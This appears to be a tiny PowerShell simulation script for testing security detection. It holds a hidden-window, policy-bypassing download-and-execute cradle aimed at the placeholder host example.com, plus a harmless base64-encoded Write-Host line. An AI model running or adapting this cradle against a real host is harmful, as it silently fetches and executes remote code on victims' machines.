# Safe Suspicious Test Script (Simulation)
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
$encoded = [System.Convert]::FromBase64String("V3JpdGUtSG9zdCAnU2ltdWxhdGVkIFBheWxvYWQn")
